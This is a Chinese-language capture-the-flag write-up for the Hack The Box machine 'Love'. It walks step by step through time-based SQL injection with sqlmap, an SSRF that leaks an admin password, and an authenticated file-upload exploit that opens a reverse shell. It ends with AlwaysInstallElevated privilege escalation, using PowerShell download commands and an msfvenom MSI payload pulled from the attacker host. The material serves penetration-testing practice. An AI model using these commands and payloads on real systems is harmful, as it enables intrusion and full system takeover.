# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

开放端口探测
```
┌──(root💀kali)-[~/htb/Love]
└─# nmap -p- 10.10.10.239 --open                                                                                                                       130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 08:49 EST
Nmap scan report for 10.10.10.239
Host is up (0.38s latency).
Not shown: 64817 closed tcp ports (reset), 699 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5000/tcp  open  upnp
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 188.90 seconds

```

端口详细信息
```
┌──(root💀kali)-[~/htb/Love]
└─# nmap -sV -Pn -AO 10.10.10.239 -P 80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 08:54 EST
Failed to resolve "80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670".
Failed to resolve "80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670".
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.10.239
Host is up (0.40s latency).                                                                                                                                  
Not shown: 992 closed tcp ports (reset)                                                                                                                      
PORT     STATE    SERVICE      VERSION
80/tcp   open     http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open     ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
445/tcp  open     microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open     mysql?
| fingerprint-strings: 
|   FourOhFourRequest, NULL, NotesRPC: 
|_    Host '10.10.14.5' is not allowed to connect to this MariaDB server
5000/tcp open     http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=1/10%Time=61DC3ADA%P=x86_64-pc-linux-gnu%r(NU
SF:LL,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFourReq
SF:uest,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,49
SF:,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server");
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (96%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Server 2008 SP2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows 8.1 Update 1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h01m34s, deviation: 4h37m10s, median: 21m32s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-10T14:17:58
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-10T06:17:59-08:00

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   403.34 ms 10.10.14.1
2   403.58 ms 10.10.10.239

Failed to resolve "80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670".
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.82 seconds

```


## web
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.239                                 

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                      
                                                                                                                                                             
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.239/_22-01-10_08-39-35.txt

Error Log: /root/dirsearch/logs/errors-22-01-10_08-39-35.log

Target: http://10.10.10.239/

[08:39:38] Starting:                                  
[08:40:04] 301 -  337B  - /ADMIN  ->  http://10.10.10.239/ADMIN/            
[08:40:04] 301 -  337B  - /Admin  ->  http://10.10.10.239/Admin/                                     
[08:40:14] 301 -  337B  - /admin  ->  http://10.10.10.239/admin/            
[08:40:14] 301 -  338B  - /admin.  ->  http://10.10.10.239/admin./          
[08:40:15] 200 -    6KB - /admin/                                           
[08:40:15] 403 -  302B  - /admin/.htaccess                                  
[08:40:15] 200 -    6KB - /admin%20/                                        
[08:40:16] 302 -    0B  - /admin/login.php  ->  index.php                   
[08:40:16] 200 -    6KB - /admin/?/login                                    
[08:40:17] 200 -    6KB - /admin/index.php                                  
[08:40:17] 302 -   16KB - /admin/home.php  ->  index.php                    
[08:40:37] 301 -  348B  - /bower_components  ->  http://10.10.10.239/bower_components/
[08:40:39] 200 -    7KB - /bower_components/                                                                      
[08:40:48] 200 -    1KB - /dist/                                            
[08:40:48] 301 -  336B  - /dist  ->  http://10.10.10.239/dist/                                 
[08:40:57] 302 -    0B  - /home.php  ->  index.php                          
[08:40:58] 301 -  338B  - /images  ->  http://10.10.10.239/images/          
[08:40:58] 200 -    2KB - /images/                                          
[08:40:58] 503 -  402B  - /examples/                                        
[08:40:59] 200 -    4KB - /index.php                                                                     
[08:41:00] 200 -    4KB - /index.pHp                                        
[08:41:01] 200 -    4KB - /index.php/login/                                 
[08:41:01] 200 -    4KB - /index.php.                                       
[08:41:01] 200 -    2KB - /includes/
[08:41:01] 301 -  340B  - /includes  ->  http://10.10.10.239/includes/
[08:41:05] 302 -    0B  - /login.php  ->  index.php                         
[08:41:06] 302 -    0B  - /logout.php  ->  index.php                                            
[08:41:20] 301 -  339B  - /plugins  ->  http://10.10.10.239/plugins/        
[08:41:20] 200 -    2KB - /plugins/                                         
```

80端口是一个叫voting system的web app，kali搜索这个程序的漏洞情况
```
┌──(root💀kali)-[~/dirsearch]
└─# searchsploit voting system                                                                                                                           6 ⨯
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Voting System - Authentication Bypass                                                                               | php/webapps/43967.py
Online Voting System 1.0 - Authentication Bypass (SQLi)                                                                    | php/webapps/50075.txt
Online Voting System 1.0 - Remote Code Execution (Authenticated)                                                           | php/webapps/50076.txt
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)                                      | php/webapps/50088.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting                                           | multiple/webapps/49159.txt
Voting System 1.0 - Authentication Bypass (SQLI)                                                                           | php/webapps/49843.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                  | php/webapps/49445.py
Voting System 1.0 - Remote Code Execution (Unauthenticated)                                                                | php/webapps/49846.txt
Voting System 1.0 - Time based SQLI (Unauthenticated SQL injection)                                                        | php/webapps/49817.txt
WordPress Plugin Poll_ Survey_ Questionnaire and Voting system 1.5.2 - 'date_answers' Blind SQL Injection                  | php/webapps/50052.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

有个未授权的RCE，试过不行。
还有个授权的RCE，但是我没没有登录凭据。
还有个sql注入，假如存在sql注入，那么我们就可以拿到用户凭据，尝试授权的RCE

尝试sql注入
```
┌──(root💀kali)-[~/htb/Love]
└─# sqlmap -r data --batch -p voter --level 5 --risk 3 
        ___
       __H__                                                                                                                                                 
 ___ ___[.]_____ ___ ___  {1.5.12#stable}                                                                                                                    
|_ -| . ["]     | .'| . |                                                                                                                                    
|___|_  [,]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:33:05 /2022-01-10/

[09:33:05] [INFO] parsing HTTP request from 'data'
[09:33:05] [INFO] resuming back-end DBMS 'mysql' 
[09:33:05] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.10.10.239:80/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: voter (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: voter=admin' AND (SELECT 4771 FROM (SELECT(SLEEP(5)))YdaT) AND 'Vvvd'='Vvvd&password=123&login=asd
---
[09:33:08] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.27, Apache 2.4.46
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:33:08] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.10.239'

[*] ending @ 09:33:08 /2022-01-10/

```

证实用户名voter字段存在基于时间的sql注入

以下payload拿到所有数据库名字
```
sqlmap -r data --batch -p voter --level 3 --risk 3 --dbms=mysql --technique=T --dbs
```

返回
```
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
[*] votesystem

```


同样的方法，一步步测试，用下面payload拿到用户凭据
```
sqlmap -r data --batch -p voter --level 3 --risk 3 --dbms=mysql --technique=T -D votesystem -T admin -C username,password --dump

Database: votesystem
Table: admin
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$psrWULJqgpPOl4HUt.ctM.vFMYJjh65EiRFDbIAZsa3z/F3t/8zXW |
+----------+--------------------------------------------------------------+

```

但是用john和hashcat我都无法爆破这个密码

## vhost爆破
把love.htb写进hosts文件
```echo "10.10.10.239  love.htb" >> /etc.hosts```

使用gobuster爆破子域名
```
┌──(root💀kali)-[~/htb/Love]
└─# gobuster vhost -u love.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://love.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/01/24 00:57:35 Starting gobuster in VHOST enumeration mode
===============================================================
Found: staging.love.htb (Status: 200) [Size: 5357]

```

得到一个```staging.love.htb```的子域名

把这个域名添加到hosts文件，打开80端口是一个叫```free file scanner```的web app

## SSRF

在Demo模块，要求输入一个url地址，尝试本地写一个php文件，用python开启一个简易的web server，再访问这个php文件，显示是可以访问，但是php没有被执行

尝试内网访问80端口：```http://127.0.0.1```
返回登录页面

尝试内网访问443端口：```http://127.0.0.1:443```
返回
```
Bad Request

Your browser sent a request that this server could not understand.
Reason: You're speaking plain HTTP to an SSL-enabled server port.
Instead use the HTTPS scheme to access this URL, please.
```

尝试内网访问5000端口

```http://127.0.0.1:5000```爆出了admin的密码信息

> Vote Admin Creds admin: @LoveIsInTheAir!!!! 

## foodhold
现在我们有了登录信息，可以利用授权的RCE拿shell
```
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)           | php/webapps/49445.py
```

源代码需要编辑相关信息，以及修改路径
```
# --- Edit your settings here ----
IP = "10.10.10.239" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.3" # Reverse shell IP
REV_PORT = "4242" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"

```


执行以后收到反弹shell
```
┌──(root💀kali)-[~/htb/Love]
└─# nc -lvnp 4242                                                                                               1 ⨯
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.239] 53219
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe

```

# 提权

传winpeas到靶机
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/winPEASx64.exe','c:\Users\Phoebe\Downloads\winPEASx64.exe')"
```


## 注册表提权

执行winpeas以后发现HKLM和HKCU的值都是1

```
����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

```
意味着我们可以使用注册表提权（Registry Escalation）

编译一个反弹shell的msi文件
```
┌──(root💀kali)-[~/htb/Love]
└─# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4444 -f msi -o setup.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: setup.msi
```

传到靶机
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/setup.msi','c:\Users\Phoebe\Downloads\setup.msi')"
```

执行msi文件
```
c:\Users\Phoebe\Downloads>.\setup.msi
.\setup.msi

```

收到反弹shell
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Sending stage (175174 bytes) to 10.10.10.239
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.239:53222 ) at 2022-01-24 02:33:20 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

已经是SYSTEM权限。